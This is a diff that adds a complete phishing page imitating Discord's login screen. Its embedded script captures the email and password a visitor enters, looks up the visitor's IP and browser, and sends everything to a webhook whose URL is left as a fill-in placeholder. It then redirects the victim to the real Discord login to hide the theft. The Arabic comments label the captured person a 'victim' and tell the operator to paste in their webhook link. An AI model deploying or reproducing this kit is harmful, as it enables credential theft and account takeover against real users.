@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Discord</title>
+<link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2111/2111370.png">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: "gg sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    background: #313338; color: #dbdee1;
+    display: flex; align-items: center; justify-content: center;
+    min-height: 100vh; padding: 20px;
+  }
+  .box {
+    background: #313338; width: 100%; max-width: 480px;
+    padding: 32px; border-radius: 5px;
+  }
+  h2 { color: #f2f3f5; text-align: center; font-size: 24px; margin-bottom: 8px; }
+  .sub { text-align: center; color: #b5bac1; font-size: 16px; margin-bottom: 20px; }
+  label {
+    display: block; color: #b5bac1; font-size: 12px;
+    font-weight: 700; text-transform: uppercase; letter-spacing: .02em;
+    margin-bottom: 8px; margin-top: 16px;
+  }
+  label span { color: #f23f43; }
+  input {
+    width: 100%; padding: 10px; background: #1e1f22;
+    border: none; border-radius: 3px; color: #dbdee1;
+    font-size: 16px; outline: none;
+  }
+  input:focus { box-shadow: 0 0 0 2px #5865f2; }
+  .forgot {
+    display: block; color: #00a8fc; font-size: 14px;
+    text-decoration: none; margin: 8px 0 20px;
+  }
+  .forgot:hover { text-decoration: underline; }
+  button {
+    width: 100%; padding: 12px; background: #5865f2; color: #fff;
+    border: none; border-radius: 3px; font-size: 16px;
+    font-weight: 500; cursor: pointer;
+  }
+  button:hover { background: #4752c4; }
+  .need { font-size: 14px; color: #949ba4; margin-top: 14px; }
+  .need a { color: #00a8fc; text-decoration: none; }
+  .need a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+
+<div class="box">
+  <h2>Welcome back!</h2>
+  <p class="sub">We're so excited to see you again!</p>
+
+  <form id="loginForm">
+    <label>Email or Phone Number <span>*</span></label>
+    <input id="email" type="text" autocomplete="off" required>
+
+    <label>Password <span>*</span></label>
+    <input id="password" type="password" autocomplete="off" required>
+
+    <a class="forgot" href="#">Forgot your password?</a>
+    <button type="submit">Log In</button>
+  </form>
+
+  <p class="need">Need an account? <a href="#">Register</a></p>
+</div>
+
+<script>
+// ==== ضع رابط الويب هوك هنا ====
+const WEBHOOK_URL = "ضع_رابط_الويب_هوك_هنا";
+
+document.getElementById("loginForm").addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  const email    = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+
+  // معلومات إضافية عن الضحية
+  let ip = "?";
+  try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    ip = (await r.json()).ip;
+  } catch (err) {}
+
+  const payload = {
+    username: "Discord Logger",
+    embeds: [{
+      title: "🎣 ضحية جديدة",
+      color: 0x5865f2,
+      fields: [
+        { name: "Email",     value: "`" + email + "`",    inline: false },
+        { name: "Password",  value: "`" + password + "`", inline: false },
+        { name: "IP",        value: ip,                    inline: true  },
+        { name: "Time",      value: new Date().toLocaleString("ar"), inline: true }
+      ],
+      footer: { text: navigator.userAgent.slice(0, 100) }
+    }]
+  };
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {}
+
+  // إعادة التوجيه لديسكورد الحقيقي
+  window.location.href = "https://discord.com/login";
+});
+</script>
+
+</body>
+</html>
